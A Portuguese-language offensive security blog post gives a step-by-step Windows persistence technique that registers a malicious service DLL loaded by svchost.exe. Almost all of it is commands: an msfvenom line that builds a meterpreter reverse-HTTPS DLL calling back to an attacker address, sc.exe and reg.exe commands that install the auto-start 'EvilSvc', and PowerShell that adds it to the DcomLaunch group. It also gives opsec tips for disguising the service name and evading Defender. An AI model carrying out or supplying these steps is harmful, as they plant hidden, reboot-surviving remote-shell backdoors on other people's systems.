## Persistencia com ServiceDll atravez do svchost.exe
>__

Baseado totalmente no artigo: https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain

"This is a quick lab that looks into a persistence mechanism that relies on installing a new Windows service, that will be hosted by an svchost.exe process."

Recentemente eu estava estudando algumas tecnicas de persistencia em sistemas windows e me deparei com esse artigo mencionado a cima. 

Nesse artigo é apresentado uma tecnica de persistencia que cria um ```service``` setando o ```binpath``` como ```svchost.exe -k DcomLaunch```, o que informará ao ```Service Control Manager``` que queremos que nosso service seja carregado pelo svchost em um grupo de serviços chamado ```DcomLaunch```.

Com o grupo DcomLaunch setado, o svchost vai consultar a registry key ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost```  que tem a lista de services que estão nesse grupo, e depois carregara os services com suas respectivas ```ServiceDll``` consultando outra registry key ```HKLM\SYSTEM\CurrentControlSet\services\<SVC-NAME>\Parameters / ServiceDll``` associada a cada service.

E é nesse ultimo passo que podemos adicionar uma dll maliciosa para ela ser executada pelo próprio service. Isso possibilita a execução de implants/droppers, varias tecnicas de process-injection ou qualquer codigo que seja possivel executar em uma dll.

(vale a pena ressaltar que essa persistencia só é possivél com privilégios elevados no alvo, como algum user domain admin ou algo do tipo)

##### Depois da introção vamos para a parte prática. 

A ideia é a seguinte, vamos partir do contexto de que você ja tenha uma shell com high-privilege na maquina alvo, então a primeira coisa é garantir que você mantenha o acesso caso algo dê errado com a shell atual...


### 1 - Persistence service dll
>__

- Aqui vem a parte em que você precisa preparar sua dll. Assim como existe "service binary" também podemos usar um "service dll". No artigo é usado um template que você pode altera-lo mas para exemplo vou usar uma dll gerada pelo msfvenom.

```
└─$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.1 lport=4321 EXITFUNC=thread  --smallest -f dll -o evil.dll
```
Os exemplos de comandos são de uma shell meterpreter, então as flags e as strings usadas podem variar dependendo do c2 ou da shell que você usar.

(Obs: para facilitar o demo o defender foi desativado porque ele barraria facilmente a dll do msfvenom. Pra isso você pode usar tecnicas de obfuscação para o implant...)

### 2 - Create EvilSvc Service
>__

- Agora criamos o service com o ```binpath``` apontando para o svchost usando o grupo DcomLaunch.

![createevilsvc](https://github.com/geleiaa/blog-repo/blob/main/imgs/createevilsvc.png)

```
sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
```

- depois de criar o service verifique se esta tudo certo

![verifyevilsvc](https://github.com/geleiaa/blog-repo/blob/main/imgs/verifyevilsvc.png)

```
sc.exe query EvilSvc
```

- opsec: O nome do service precisa ser algo que não levante suspeita e também vale a pena adicionar alguma descrição para que fique mais credivél. Você pode tirar ideias e se basear em ttps do mitre sobre esse tema.


### 3 - Modify EvilSvc - Specify ServiceDLL Path
>__

- Aqui vamos editar a registry key associada ao EvilSvc para adicionar a dll maliciosa ```HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\```.

![setpathsvcdll](https://github.com/geleiaa/blog-repo/blob/main/imgs/setpathsvcdll.png)

```
reg.exe add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f
```

- verifique se o path foi setado

![verifysvcdllpath](https://github.com/geleiaa/blog-repo/blob/main/imgs/verifysvcdllpath.png)

```
reg.exe queryHKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll 
```


### 4 - Group EvilSvc with DcomLaunch
>__

- Nessa parte adicionamos o EvilSvc ao grupo DcomLaunch alterando a registry key ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost /v DcomLaunch```. No artigo é feito direto pelo registry editor mas como só temos acesso via cli, vamos usar powershell pra isso.

![setsvctodcom](https://github.com/geleiaa/blog-repo/blob/main/imgs/setsvctodcom.png)


```
// path para a reg key
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"

// pega a lista de services
$current = Get-ItemProperty -Path $path -Name DcomLaunch

// add o EvilSvc na lista
$newList = $current.DcomLaunch + "EvilSvc"

// redefine os valores da var DcomLaunch
Set-ItemProperty -Path $path -Name DcomLaunch -Value $newList
```
Você pode juntar isso numa oneliner e executar como na imagem acima.

- Fazendo dessa forma é possivel preservar a lista default do grupo DcomLaunch. Se for feito com o reg.exe ele vai sobrescrever os valores podendo causar falha em alguns services.


- Depois verifique se o EvilSvc foi adicionado

![verifysvcindcom](https://github.com/geleiaa/blog-repo/blob/main/imgs/verifysvcindcom.png)

```
reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v DcomLaunch
```

#### Agora com tudo feito a persistencia está pronta. Como o service foi criado com "start auto", quando houver algum reboot o service será iniciado e carregado com o grupo DcomLaunch.

- msf session
![getsession](https://github.com/geleiaa/blog-repo/blob/main/imgs/getsession.png)

- svc running with rundll32
![svcrun1](https://github.com/geleiaa/blog-repo/blob/main/imgs/svcrun1.png)

- svc dll path
![svcrun2](https://github.com/geleiaa/blog-repo/blob/main/imgs/svcrun2.png)





